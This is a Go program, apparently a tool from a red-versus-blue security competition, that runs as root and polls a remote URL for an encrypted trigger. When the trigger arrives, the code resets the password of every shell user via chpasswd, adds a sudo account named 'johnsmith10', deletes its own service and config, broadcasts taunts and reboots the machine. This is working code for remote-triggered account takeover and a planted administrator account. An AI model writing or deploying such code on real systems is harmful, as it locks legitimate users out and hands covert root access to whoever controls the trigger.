//go:build linux || darwin || freebsd || netbsd || openbsd

package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

func main() {

	// Verify the program is being run as root
	if os.Geteuid() != 0 {
		fmt.Println(Red + "Program started with insufficient permissions, please re-run as root." + Reset)
		os.Exit(10)
	}

	// Check for config file
	if _, err := os.Stat(LinuxConfigLocation); os.IsNotExist(err) {
		fmt.Println("No config file detected.")
		fmt.Println("Beginning first time setup...")
		LinuxFirstTimeSetup() // Should exit on its own...
		os.Exit(0)            // (just in case)
	}

	// Loads & unprotects the config file to MasterConfig
	err := LoadStructFromFile(&MasterConfig, LinuxConfigLocation, MasterKey)
	handle(err)

	for {

		resp, err := http.Get(MasterConfig.RepoUrl)
		time.Sleep(5 * time.Second) // so we don't get rate limited

		if err != nil || resp.StatusCode != 200 {
			continue
		}

		blob, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(Red+"Error reading response body:", err)
			return
		}
		resp.Body.Close()

		// ALL CODE PAST THIS POINT SHOULD ONLY RUN
		// IF THE ACTIVATE FILE WAS SUCCESSFULLY READ

		// read all user accounts
		file, err := os.Open("/etc/passwd")
		handle(err)

		var userPassPairs []string // store stdin passed to chpasswd command

		// decrypt backup password from ACTIVATE file
		decryptedBytes, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, &MasterConfig.Protector, blob, nil)
		handle(err)

		passwd := string(decryptedBytes)

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := scanner.Text()

			// ignore comments
			if strings.HasPrefix(line, "#") {
				continue
			}

			// Split the line into fields
			fields := strings.Split(line, ":")
			if len(fields) > 0 {
				user := fields[0]

				switch fields[6] {
				case "/bin/bash", "/bin/sh", "/bin/zsh":
					// Append user-password pair for chpasswd
					userPassPairs = append(userPassPairs, fmt.Sprintf("%s:%s", user, passwd))
					break
				default:
					continue
				}
			}
		}

		if err := scanner.Err(); err != nil {
			fmt.Println("Error reading /etc/passwd:", err)
			return
		}

		// Run chpasswd to update passwords
		// Join user-password pairs with newlines
		input := strings.Join(userPassPairs, "\n")

		// Run chpasswd command
		cmd := exec.Command("chpasswd")
		cmd.Stdin = bytes.NewBufferString(input)
		if err := cmd.Run(); err != nil {
			log.Fatalf("Failed to change passwords: %v", err)
		} else {
			log.Println("Passwords changed successfully")
		}

		// Add one more local sudo user just in case
		new_user_cmd := exec.Command("sh", "-c", "useradd -m johnsmith10 && (usermod -aG wheel johnsmith10 || usermod -aG sudo johnsmith10)")
		err = new_user_cmd.Run()
		handle(err) // shouldn't trigger

		// Cleanup (in case we need to re-deploy)
		exec.Command("systemctl", "disable", "one.service").Run()
		exec.Command("rm", "-f", "/etc/project-one/config.protected").Run()

		// :trollskull:
		LinuxBroadcast("You really thought you won, huh?")
		go func() {
			for {
				LinuxBroadcast("Sorry, try again! :P")
			}
		}()
		time.Sleep(2500 * time.Millisecond)

		LinuxBroadcast(TrollFace)
		// reboot to kick out any attackers
		time.Sleep(500 * time.Millisecond)
		exec.Command("reboot").Run()

		os.Exit(0) // should be unreachable
	}
}
